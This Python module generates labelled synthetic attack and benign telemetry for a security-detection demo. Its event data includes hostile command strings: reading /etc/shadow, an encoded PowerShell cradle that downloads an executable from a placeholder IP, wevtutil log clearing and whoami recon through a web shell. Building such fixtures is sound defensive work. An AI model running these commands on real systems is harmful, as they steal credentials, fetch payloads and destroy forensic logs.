from __future__ import annotations

import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import Dict, List, Optional

from .. import settings
from ..models import Severity

# Documentation-range IPs used in the demo (RFC 5737 / safe test ranges).
IP_SSH_BRUTE = "203.0.113.10"
IP_C2 = "198.51.100.45"
IP_TOR = "185.220.101.5"
IP_STAGING = "203.0.113.30"
IP_EXFIL_DST = "203.0.113.99"
IP_MINER_POOL = "203.0.113.66"
IP_AMB_PROXY = "203.0.113.77"
IP_VENDOR = "5.6.7.8"
IP_SG = "113.23.12.5"
IP_SCANNER = "10.0.0.5"
IP_EGRESS = "10.0.99.10"
IP_VPN = "10.200.0.22"


@dataclass
class Scenario:
    id: str
    name: str
    expected: str  # true_positive | false_positive | ambiguous
    events: List[Dict] = field(default_factory=list)
    alerts: List[Dict] = field(default_factory=list)


def _ts(anchor: datetime, minutes: float) -> datetime:
    return anchor + timedelta(minutes=minutes)


def _ev(key: str, source: str, event_type: str, ts: datetime, **kw) -> Dict:
    base = {
        "id": key,
        "source": source,
        "event_type": event_type,
        "timestamp": ts.isoformat(),
        "action": "allow",
        "outcome": "success",
    }
    base.update(kw)
    return base


def _alert(
    key: str, rule: str, title: str, sev: Severity, desc: str, ts: datetime,
    source: str, mitre: List[str], **kw,
) -> Dict:
    base = {
        "id": key,
        "rule_name": rule,
        "title": title,
        "severity": sev.value,
        "description": desc,
        "timestamp": ts.isoformat(),
        "source": source,
        "mitre": mitre,
    }
    base.update(kw)
    return base


class Synthesizer:
    """Generates a realistic, reproducible mix of benign + malicious telemetry."""

    def __init__(self, seed: Optional[int] = None):
        self.rng = random.Random(settings.DEMO_SEED if seed is None else seed)
        self.anchor = datetime.now().replace(microsecond=0)
        self._n_ev = 0
        self._n_alt = 0
        self._n_base = 0

    # -- id helpers ------------------------------------------------------
    def _eid(self, tag: str) -> str:
        self._n_ev += 1
        return f"ev-{tag}-{self._n_ev:03d}"

    def _aid(self) -> str:
        self._n_alt += 1
        return f"alt-{self._n_alt:03d}"

    def _bid(self) -> str:
        self._n_base += 1
        return f"ev-base-{self._n_base:03d}"

    # -- scenario builders -----------------------------------------------
    def _ssh_brute_force(self, t: datetime) -> Scenario:
        sc = Scenario("ssh_brute_force", "SSH brute force on DB server", "true_positive")
        host, ip = "corp-srv-db01", IP_SSH_BRUTE
        for i in range(30):
            sc.events.append(_ev(
                self._eid("auth"), "auth", "auth_failure", _ts(t, i * 1.1),
                actor_ip=ip, target_host=host,
                target_user="root", action="deny", outcome="failure",
                detail={"service": "ssh", "attempt": i + 1, "rotating_source_host": f"wl-{i % 9}"},
            ))
        sc.events.append(_ev(
            self._eid("auth"), "auth", "auth_success", _ts(t, 36),
            actor_ip=ip, target_host=host, target_user="root",
            detail={"service": "ssh", "login_after_bruteforce": True},
        ))
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "process_start", _ts(t, 37),
            actor_host=host, actor_user="root", detail={"executable": "/usr/bin/sudo", "args": "sudo -l && cat /etc/shadow"},
        ))
        sc.alerts.append(_alert(
            self._aid(), "Brute_Force_SSH", "SSH brute-force followed by successful login",
            Severity.MEDIUM,
            "30 failed SSH password attempts from {ip} on {host}, then a successful root login "
            "and sudo activity. T1110".format(ip=ip, host=host),
            _ts(t, 38), "auth", ["T1110"],
            entity_ip=ip, entity_host=host, event_ids=[e["id"] for e in sc.events],
        ))
        return sc

    def _impossible_travel_tp(self, t: datetime) -> Scenario:
        sc = Scenario("impossible_travel", "Impossible travel from Alice's account", "true_positive")
        sc.events.append(_ev(
            self._eid("auth"), "auth", "auth_success", _ts(t, 0),
            actor_user="alice.smith", actor_ip="10.0.1.12", actor_host="corp-egress-1",
            geo="Manila, PH", detail={"device": "work-laptop", "auth_method": "password+mfa"},
        ))
        sc.events.append(_ev(
            self._eid("auth"), "auth", "auth_success", _ts(t, 12),
            actor_user="alice.smith", actor_ip=IP_SG, actor_host="corp-egress-2",
            geo="Singapore, SG", detail={"device": "chrome-session-fingerprint-7f2", "auth_method": "password+mfa", "new_device": True},
        ))
        sc.alerts.append(_alert(
            self._aid(), "Impossible_Travel", "Impossible travel for alice.smith",
            Severity.HIGH,
            "Successful authentication for alice.smith from Manila, PH then Singapore, SG 12 "
            "minutes apart using a new device fingerprint. T1078 / T1021.",
            _ts(t, 13), "auth", ["T1078"],
            entity_user="alice.smith", event_ids=[e["id"] for e in sc.events],
        ))
        return sc

    def _phishing_click(self, t: datetime) -> Scenario:
        sc = Scenario("phishing_click", "Alice clicked a phishing link", "true_positive")
        sc.events.append(_ev(
            self._eid("email"), "email", "email_click", _ts(t, 0),
            actor_user="alice.smith", target_host="mail.acme.test",
            detail={"sender": "billing@acme-invoice.org", "subject": "Invoice #44821 overdue",
                    "url": "http://acme-invoice.org/track/9f2", "spf": "fail", "dkim": "fail"},
        ))
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "process_start", _ts(t, 1),
            actor_host="corp-ws-01", actor_user="alice.smith",
            detail={"executable": "chrome", "url": "http://acme-invoice.org/track/9f2"},
        ))
        sc.events.append(_ev(
            self._eid("network"), "network", "dns_query", _ts(t, 2),
            actor_host="corp-ws-01", target_ip=IP_C2,
            detail={"query": "acme-invoice.org", "resolves_to": IP_C2, "response_code": "NOERROR"},
        ))
        sc.events.append(_ev(
            self._eid("network"), "network", "outbound_connection", _ts(t, 3),
            actor_host="corp-ws-01", target_ip=IP_C2,
            detail={"bytes_sent": 4096, "process": "chrome", "port": 443},
        ))
        sc.alerts.append(_alert(
            self._aid(), "Phish_Click_Malicious_URL", "Phishing link clicked, beacon to C2",
            Severity.HIGH,
            "alice.smith clicked a link in a fraudulent invoice email; DNS resolved to {ip}, which is "
            "listed as known C2 infrastructure. T1566.002, T1105.".format(ip=IP_C2),
            _ts(t, 5), "email", ["T1566.002", "T1105"],
            entity_user="alice.smith", entity_host="corp-ws-01",
            event_ids=[e["id"] for e in sc.events],
        ))
        return sc

    def _mfa_fatigue(self, t: datetime) -> Scenario:
        sc = Scenario("mfa_fatigue", "MFA push fatigue against Alice", "true_positive")
        for i in range(14):
            sc.events.append(_ev(
                self._eid("auth"), "auth", "auth_mfa_push", _ts(t, i * 1.3),
                actor_user="alice.smith", actor_ip=IP_SG, target_user="alice.smith",
                action="deny", outcome="failure",
                detail={"push": "idp-push-{i}".format(i=i), "reason": "push attended and denied",
                        "device": "chrome-session-fingerprint-7f2"},
            ))
        sc.events.append(_ev(
            self._eid("auth"), "auth", "auth_mfa_push", _ts(t, 19.5),
            actor_user="alice.smith", actor_ip=IP_SG, target_user="alice.smith",
            outcome="success", detail={"push": "idp-push-15", "reason": "push approved",
                                       "device": "chrome-session-fingerprint-7f2"},
        ))
        sc.alerts.append(_alert(
            self._aid(), "MFA_Fatigue", "Possible MFA fatigue attack on alice.smith",
            Severity.HIGH,
            "15 consecutive MFA push prompts attended-and-denied, then a push approved from the "
            "same new device fingerprint. Classic fatigue-then-success pattern. T1621.",
            _ts(t, 21), "auth", ["T1621"],
            entity_user="alice.smith", entity_ip=IP_SG, event_ids=[e["id"] for e in sc.events],
        ))
        return sc

    def _tor_exit_login(self, t: datetime) -> Scenario:
        sc = Scenario("tor_exit_login", "Alice signed in from a Tor exit node", "true_positive")
        sc.events.append(_ev(
            self._eid("auth"), "auth", "auth_success", _ts(t, 0),
            actor_user="alice.smith", actor_host="corp-egress-3", actor_ip=IP_TOR,
            geo="Frankfurt, DE", detail={"device": "chrome-session-fingerprint-7f2", "anonymizer": "recommended"},
        ))
        sc.events.append(_ev(
            self._eid("network"), "network", "outbound_connection", _ts(t, 2),
            actor_host="corp-ws-01", target_ip=IP_TOR,
            detail={"process": "svchost", "bytes_sent": 65536, "port": 9001},
        ))
        sc.alerts.append(_alert(
            self._aid(), "Login_From_Anonymous_IP", "Login from Tor exit IP",
            Severity.MEDIUM,
            "Successful authentication for alice.smith from {ip}, an Tor exit node with no org "
            "presence in Frankfurt that matches known anonymizer infrastructure. T1090.003.".format(ip=IP_TOR),
            _ts(t, 3), "auth", ["T1090.003"],
            entity_user="alice.smith", event_ids=[e["id"] for e in sc.events],
        ))
        return sc

    def _persistence_scheduled_task(self, t: datetime) -> Scenario:
        sc = Scenario("persistence_scheduled_task", "Scheduled task persistence on Alice's host", "true_positive")
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "process_start", _ts(t, 0),
            actor_host="corp-ws-01", actor_user="alice.smith",
            detail={"executable": "powershell.exe", "args": "-enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADQANQAvAGEALgBlAHgAZQAnACwAIAAnAEMAOgBcAFUAcwBlAHIAcwBcAGEAJwA=",
                    "encoded_command": True},
        ))
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "file_write_temp", _ts(t, 1),
            actor_host="corp-ws-01", actor_user="alice.smith",
            detail={"path": r"C:\Users\alice.smith\AppData\Local\Temp\a.exe", "size": 733184},
        ))
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "scheduled_task_create", _ts(t, 2),
            actor_host="corp-ws-01", actor_user="alice.smith",
            detail={"task": r"UpdaterRun", "action": r"C:\Users\alice.smith\AppData\Local\Temp\a.exe", "run_level": "highest"},
        ))
        sc.events.append(_ev(
            self._eid("network"), "network", "outbound_connection", _ts(t, 4),
            actor_host="corp-ws-01", target_ip=IP_TOR,
            detail={"process": "a.exe", "bytes_sent": 81920, "hours_since_start": 0, "port": 4444},
        ))
        sc.alerts.append(_alert(
            self._aid(), "Persistence_Scheduled_Task", "Scheduled task persistence with encoded payload",
            Severity.HIGH,
            "encoded PowerShell dropped a binary to AppData Temp, registered a run-at-login "
            "scheduled task and beacons outbound to a Tor exit. T1053.005 / T1059.001 / T1074.001.",
            _ts(t, 5), "endpoint", ["T1053.005", "T1059.001"],
            entity_user="alice.smith", entity_host="corp-ws-01",
            event_ids=[e["id"] for e in sc.events],
        ))
        return sc

    def _data_exfil(self, t: datetime) -> Scenario:
        sc = Scenario("data_exfil", "Large HTTPS exfiltration from file share", "true_positive")
        sc.events.append(_ev(
            self._eid("auth"), "auth", "auth_success", _ts(t, 0),
            actor_user="alice.smith", actor_ip="10.0.1.12", target_host="corp-srv-file01",
            detail={"service": "smb", "share": "//corp-srv-file01/Finance"},
        ))
        sc.events.append(_ev(
            self._eid("network"), "network", "outbound_connection", _ts(t, 5),
            actor_host="corp-srv-file01", target_ip=IP_EXFIL_DST,
            detail={"bytes_sent": 2_200_000_000, "duration_min": 47, "bytes_vs_baseline_x": 23.6,
                    "process": "svchost", "geo": "Unknown", "port": 443},
        ))
        sc.alerts.append(_alert(
            self._aid(), "Data_Exfil_HTTPS", "2.2 GB outbound HTTPS transfer from file server",
            Severity.CRITICAL,
            "corp-srv-file01 is pushing a sustained volume of data over 47 minutes to {ip}:443 with "
            "no prior relationship, at 23.6x the host baseline. Destination lacks org geo. "
            "Ongoing transfer. T1048.003.".format(ip=IP_EXFIL_DST),
            _ts(t, 7), "network", ["T1048.003"],
            entity_user="alice.smith", entity_host="corp-srv-file01",
            event_ids=[e["id"] for e in sc.events],
        ))
        return sc

    def _credential_dump(self, t: datetime) -> Scenario:
        sc = Scenario("credential_dump", "LSASS credential dumping on bob's host", "true_positive")
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "lsass_access", _ts(t, 0),
            actor_host="corp-ws-02", actor_user="bob.johnson",
            detail={"accessing_process": r"C:\Users\bob.johnson\AppData\Local\Temp\ms.exe",
                    "access_types": ["PROCESS_VM_READ", "PROCESS_QUERY_INFORMATION"], "privilege": "SeDebugPrivilege"},
        ))
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "process_start", _ts(t, 1),
            actor_host="corp-ws-02", actor_user="bob.johnson",
            detail={"executable": r"ms.exe", "parent": "explorer.exe", "unsigned": True},
        ))
        sc.alerts.append(_alert(
            self._aid(), "Credential_Dump_LSASS", "Suspicious LSASS memory access",
            Severity.CRITICAL,
            "An unsigned binary in AppData Temp opened LSASS with PROCESS_VM_READ. Matches "
            "credential dumping. T1003.001.",
            _ts(t, 2), "endpoint", ["T1003.001"],
            entity_user="bob.johnson", entity_host="corp-ws-02",
            event_ids=[e["id"] for e in sc.events],
        ))
        return sc

    def _lateral_movement(self, t: datetime) -> Scenario:
        sc = Scenario("lateral_movement", "PsExec lateral movement to web server", "true_positive")
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "process_start", _ts(t, 0),
            actor_host="corp-ws-04", actor_user="dave.wilson",
            detail={"executable": r"C:\Windows\System32\psexesvc.exe", "command_line": r"psexec \\corp-srv-web01 -u dave.wilson -p **** cmd /c ipconfig"},
        ))
        sc.events.append(_ev(
            self._eid("auth"), "auth", "auth_success", _ts(t, 1),
            actor_user="dave.wilson", actor_ip="10.0.1.16", target_host="corp-srv-web01",
            detail={"logon_type": 3, "service": "netlogon", "network": "corp-ws-04:445->corp-srv-web01:445"},
        ))
        sc.alerts.append(_alert(
            self._aid(), "Lateral_Movement", "PsExec admin share activity",
            Severity.HIGH,
            "psexesvc run on corp-srv-web01 from corp-ws-04 under dave.wilson; admin share logon "
            "type 3. T1021.001 / T1570.",
            _ts(t, 3), "endpoint", ["T1021.001", "T1570"],
            entity_user="dave.wilson", entity_host="corp-srv-web01",
            event_ids=[e["id"] for e in sc.events],
        ))
        return sc

    def _log_tampering(self, t: datetime) -> Scenario:
        sc = Scenario("log_tampering", "Event log clearing on DB server", "true_positive")
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "log_clear", _ts(t, 0),
            actor_host="corp-srv-db01",
            detail={"event_log": "Security", "source": "EventLog", "channel_cleared": True},
        ))
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "process_start", _ts(t, 1),
            actor_host="corp-srv-db01", detail={"executable": "wevtutil.exe", "args": "cl Security"},
        ))
        sc.alerts.append(_alert(
            self._aid(), "Log_Tampering", "Security event log cleared",
            Severity.CRITICAL,
            "Security event log on corp-srv-db01 was cleared via wevtutil, which is almost always "
            "adversarial and destroys forensic evidence. T1562.001.",
            _ts(t, 2), "endpoint", ["T1562.001"],
            entity_host="corp-srv-db01", event_ids=[e["id"] for e in sc.events],
        ))
        return sc

    def _crypto_miner(self, t: datetime) -> Scenario:
        sc = Scenario("crypto_miner", "Crypto miner on app server", "true_positive")
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "process_start", _ts(t, 0),
            actor_host="corp-srv-app02", actor_user="svc-app",
            detail={"executable": r"C:\Windows\Temp\xmrig.exe", "parent": "w3wp.exe", "unsigned": True},
        ))
        sc.events.append(_ev(
            self._eid("network"), "network", "outbound_connection", _ts(t, 2),
            actor_host="corp-srv-app02", target_ip=IP_MINER_POOL,
            detail={"process": "xmrig.exe", "protocol": "stratum+tcp", "cpu_avg": 96, "port": 3333},
        ))
        sc.alerts.append(_alert(
            self._aid(), "Crypto_Miner", "Mining binary executing from Temp",
            Severity.MEDIUM,
            "xmrig.exe running from Windows Temp under the app service account, connecting to "
            "a stratum mining pool. T1496.",
            _ts(t, 3), "endpoint", ["T1496"],
            entity_host="corp-srv-app02", event_ids=[e["id"] for e in sc.events],
        ))
        return sc

    def _scanner_noise(self, t: datetime) -> Scenario:
        sc = Scenario("scanner_noise", "Scheduled vulnerability scan (noise)", "false_positive")
        sc.events.append(_ev(
            self._eid("ids"), "vuln", "ids_alert", _ts(t, 0),
            actor_ip=IP_SCANNER, actor_host="scanner-node-1",
            target_ip="10.0.3.45", detail={"signature": "ET SCAN SYN Port Scan"},
        ))
        sc.events.append(_ev(
            self._eid("ids"), "vuln", "ids_alert", _ts(t, 5),
            actor_ip=IP_SCANNER, actor_host="scanner-node-1",
            target_ip="10.0.3.46", detail={"signature": "ET SCAN FULL CONNECT Port Scan"},
        ))
        sc.alerts.append(_alert(
            self._aid(), "IDS_Sig_Scan_Detect", "IDS signature match — port scan",
            Severity.LOW,
            "Internal vulnerability scanner (10.0.0.5) matched port-scan signatures; scanner runs "
            "every Sunday 02:00 UTC. Expected indication, no attacker behavior.",
            _ts(t, 6), "vuln", ["T1046"],
            entity_ip=IP_SCANNER, entity_host="scanner-node-1",
            event_ids=[e["id"] for e in sc.events],
            raw={"scheduled": True, "schedule": "weekly Sunday 02:00 UTC", "scanner_policy": "acme-vuln-scan-prod"},
        ))
        return sc

    def _eicar_test(self, t: datetime) -> Scenario:
        sc = Scenario("eicar_test", "EICAR test file on quarantine box", "false_positive")
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "file_write_temp", _ts(t, 0),
            actor_host="corp-ws-test-01", actor_user="qa.automation",
            detail={"path": r"C:\Users\qa.automation\Downloads\eicar.com", "threat_name": "EICAR-Test-String"},
        ))
        sc.alerts.append(_alert(
            self._aid(), "AV_Malware_Detected", "Antivirus flagged EICAR test file",
            Severity.LOW,
            "EICAR test string detected on corp-ws-test-01, a designated AV validation VM. "
            "Quarterly QA drop, expected.",
            _ts(t, 1), "endpoint", [],
            entity_host="corp-ws-test-01", event_ids=[e["id"] for e in sc.events],
            raw={"scheduled": True, "schedule": "quarterly QA EICAR drop"},
        ))
        return sc

    def _backup_3am(self, t: datetime) -> Scenario:
        sc = Scenario("backup_3am", "Backup service account at 03:00", "false_positive")
        sc.events.append(_ev(
            self._eid("auth"), "auth", "auth_success", _ts(t, 0),
            actor_user="backup.svc", actor_ip=IP_EGRESS, actor_host="backup-srv-1",
            target_host="corp-srv-file01", detail={"service": "smb", "job": "Nightly-Finance-Share",
                                                    "scheduled": True},
        ))
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "process_start", _ts(t, 1),
            actor_host="backup-srv-1", actor_user="backup.svc",
            detail={"executable": r"C:\Program Files\Veeam\Backup.exe", "args": "--job Nightly-Finance-Share"},
        ))
        sc.alerts.append(_alert(
            self._aid(), "Unusual_Hour_Login", "Service account login at 03:00",
            Severity.LOW,
            "backup.svc authenticated to the file share at 03:00 from the backup egress. This "
            "account exists solely for scheduled backups; behavior matches configured job.",
            _ts(t, 2), "auth", ["T1078"],
            entity_user="backup.svc", event_ids=[e["id"] for e in sc.events],
        ))
        return sc

    def _vpn_impossible_travel(self, t: datetime) -> Scenario:
        sc = Scenario("vpn_impossible_travel", "Impossible travel via corporate VPN (benign)", "false_positive")
        sc.events.append(_ev(
            self._eid("auth"), "auth", "auth_success", _ts(t, 0),
            actor_user="carol.davis", actor_ip=IP_VPN, actor_host="corp-vpn-1",
            geo="Manila, PH", detail={"vpn": True, "connection": "client-MNL-10", "device": "carol-mbp"},
        ))
        sc.events.append(_ev(
            self._eid("auth"), "auth", "auth_success", _ts(t, 18),
            actor_user="carol.davis", actor_ip=IP_VPN, actor_host="corp-vpn-1",
            geo="Singapore, SG", detail={"vpn": True, "connection": "client-SIN-10", "device": "carol-mbp"},
        ))
        sc.alerts.append(_alert(
            self._aid(), "Impossible_Travel", "Impossible travel for carol.davis via VPN",
            Severity.MEDIUM,
            "carol.davis authenticated from Manila then Singapore 18 minutes apart. Both sessions "
            "came through the corporate VPN concentrator (10.200.0.22), which is the expected "
            "routing for roaming employees aboard.",
            _ts(t, 19), "auth", ["T1078"],
            entity_user="carol.davis", event_ids=[e["id"] for e in sc.events],
            raw={"vpn": True, "concentrator": "10.200.0.22"},
        ))
        return sc

    def _pwsh_maintenance(self, t: datetime) -> Scenario:
        sc = Scenario("pwsh_maintenance", "Encoded PowerShell during maintenance window", "ambiguous")
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "process_start", _ts(t, 0),
            actor_host="corp-ws-03", actor_user="carol.davis",
            detail={"executable": "powershell.exe", "args": "-enc SQBFAFgAIAAoAEcAZQB0AC0ARABhAHQAZQApAA==",
                    "maintenance_window": True, "change_ticket": "CHG-004221", "user_role": "admin"},
        ))
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "process_start", _ts(t, 1),
            actor_host="corp-ws-03", actor_user="carol.davis",
            detail={"executable": "powershell.exe", "args": "-Command 'Get-Date'", "parent": "WMIC.exe", "encoded_command": True},
        ))
        sc.alerts.append(_alert(
            self._aid(), "Suspicious_PowerShell", "Encoded PowerShell from admin account",
            Severity.MEDIUM,
            "carol.davis (IT admin) executed encoded PowerShell during the 02:00-04:00 maintenance "
            "window referenced by change ticket CHG-004221. Technique commonly abused; context "
            "determines risk.",
            _ts(t, 2), "endpoint", ["T1059.001"],
            entity_user="carol.davis", entity_host="corp-ws-03",
            event_ids=[e["id"] for e in sc.events],
            raw={"change_ticket": "CHG-004221", "maintenance_window": "02:00-04:00"},
        ))
        return sc

    def _new_device_signin(self, t: datetime) -> Scenario:
        sc = Scenario("new_device_signin", "Bob signed in from an unknown device", "ambiguous")
        sc.events.append(_ev(
            self._eid("auth"), "auth", "auth_success", _ts(t, 0),
            actor_user="bob.johnson", actor_ip="89.103.11.22", actor_host="corp-egress-4",
            geo="Frankfurt, DE", detail={"device": "iphone-17", "device_type": "mobile", "known_device": False,
                                         "geoposition": "Frankfurt Messe area"},
        ))
        sc.alerts.append(_alert(
            self._aid(), "New_Sign_In", "First sign-in from unknown device",
            Severity.MEDIUM,
            "bob.johnson signed in successfully from an IP with no org history and a device never "
            "seen before. Could be a new phone on a business trip, or account takeover.",
            _ts(t, 1), "auth", ["T1078"],
            entity_user="bob.johnson", event_ids=[e["id"] for e in sc.events],
        ))
        return sc

    def _many_denied_logins(self, t: datetime) -> Scenario:
        sc = Scenario("many_denied_logins", "Flood of denied logins against eve's account", "ambiguous")
        for i in range(12):
            sc.events.append(_ev(
                self._eid("auth"), "auth", "auth_failure", _ts(t, i * 0.8),
                actor_ip=IP_VENDOR, actor_host=f"vendor-wl-{i % 5}", target_user="eve.martin",
                action="deny", outcome="failure", detail={"service": "saml", "reason": "bad_password", "attempt": i + 1},
            ))
        sc.alerts.append(_alert(
            self._aid(), "Brute_Force_SAML", "Repeated denied logins — brute force?",
            Severity.MEDIUM,
            "12 failed SAML logins against eve.martin from {ip} over 9 minutes. All denied, no "
            "success. IP may belong to an onboarding vendor (intel lookup needed).".format(ip=IP_VENDOR),
            _ts(t, 10), "auth", ["T1110"],
            entity_user="eve.martin", entity_ip=IP_VENDOR,
            event_ids=[e["id"] for e in sc.events],
        ))
        return sc

    def _outbound_anon_proxy(self, t: datetime) -> Scenario:
        sc = Scenario("outbound_anon_proxy", "Outbound HTTPS to flagged anonymous proxy", "ambiguous")
        sc.events.append(_ev(
            self._eid("network"), "network", "outbound_connection", _ts(t, 0),
            actor_host="corp-ws-04", actor_user="dave.wilson", target_ip=IP_AMB_PROXY,
            detail={"process": "chrome", "content_type": "text/html", "cert_org": "CloudFront",
                    "country": "US", "bytes_sent": 588_000, "open_pages": 3, "port": 443},
        ))
        sc.alerts.append(_alert(
            self._aid(), "Anon_Proxy_Access", "Connection to flagged anonymous proxy",
            Severity.LOW,
            "dave.wilson's host connected to {ip}, categorized as an anonymous proxy by threat "
            "intel, but pages served benign web content from a CDN. Portal page or real proxy?".format(ip=IP_AMB_PROXY),
            _ts(t, 1), "network", ["T1090.003"],
            entity_user="dave.wilson", entity_host="corp-ws-04",
            event_ids=[e["id"] for e in sc.events],
        ))
        return sc

    def _web_shell(self, t: datetime) -> Scenario:
        sc = Scenario("web_shell", "Web shell on corporate website", "true_positive")
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "process_start", _ts(t, 0),
            actor_host="corp-srv-web01", actor_user="svc-iis",
            detail={"executable": "w3wp.exe", "child": "cmd.exe", "args": "cmd /c whoami & dir C:\inetpub"},
        ))
        sc.events.append(_ev(
            self._eid("endpoint"), "endpoint", "file_write_temp", _ts(t, 1),
            actor_host="corp-srv-web01", actor_user="svc-iis",
            detail={"path": r"C:\inetpub\wwwroot\uploads\sitehealth.aspx", "size": 18432},
        ))
        sc.events.append(_ev(
            self._eid("network"), "network", "outbound_connection", _ts(t, 3),
            actor_host="corp-srv-web01", target_ip=IP_C2,
            detail={"process": "w3wp.exe", "period": 300, "beacon": True, "port": 8080},
        ))
        sc.alerts.append(_alert(
            self._aid(), "Web_Shell", "Web shell planted in IIS web root",
            Severity.CRITICAL,
            "w3wp.exe spawned cmd.exe, a file appeared in the web root, and the site now beacons "
            "every 5 minutes to C2 {ip}. Active compromise. T1505.003 / T1105.".format(ip=IP_C2),
            _ts(t, 10), "endpoint", ["T1505.003", "T1105"],
            entity_host="corp-srv-web01", event_ids=[e["id"] for e in sc.events],
        ))
        return sc

    # -- benign baseline ---------------------------------------------------
    def _baseline(self, t: datetime) -> List[Dict]:
        events: List[Dict] = []
        users = ["alice.smith", "bob.johnson", "carol.davis", "dave.wilson", "eve.martin"]
        for i in range(60):
            u = self.rng.choice(users)
            events.append(_ev(
                self._bid(), "auth", self.rng.choice(["auth_success", "auth_success", "auth_success", "dns_query"]),
                _ts(t, -720 + i * 12), actor_user=u, actor_ip=f"10.0.1.{self.rng.randint(10, 40)}",
                actor_host="corp-egress-1", detail={"baseline": True},
            ))
        return events

    # -- public API ---------------------------------------------------------
    def generate(self) -> List[Scenario]:
        scenarios = [Scenario("baseline", "Normal network baseline",
                              "benign", events=self._baseline(self.anchor))]
        builders = [
            (self._ssh_brute_force, -260),
            (self._impossible_travel_tp, -245),
            # campaign: phishing -> MFA fatigue -> Tor login -> persistence -> exfil.
            # Spans ~2h with ≤45min between hops so the correlation engine must use
            # transitive closure to stitch all five detections into one incident.
            (self._phishing_click, -160),
            (self._mfa_fatigue, -135),
            (self._tor_exit_login, -110),
            (self._persistence_scheduled_task, -70),
            (self._data_exfil, -40),
            (self._credential_dump, -200),
            (self._lateral_movement, -185),
            (self._log_tampering, -170),
            (self._crypto_miner, -150),
            (self._scanner_noise, -95),
            (self._eicar_test, -140),
            (self._backup_3am, -630),
            (self._vpn_impossible_travel, -120),
            (self._pwsh_maintenance, -90),
            (self._new_device_signin, -80),
            (self._many_denied_logins, -300),
            (self._outbound_anon_proxy, -50),
            (self._web_shell, -30),
        ]
        for builder, offset in builders:
            scenarios.append(builder(_ts(self.anchor, offset)))
        return scenarios


def generate_demo(seed: Optional[int] = None) -> List[Scenario]:
    return Synthesizer(seed=seed).generate()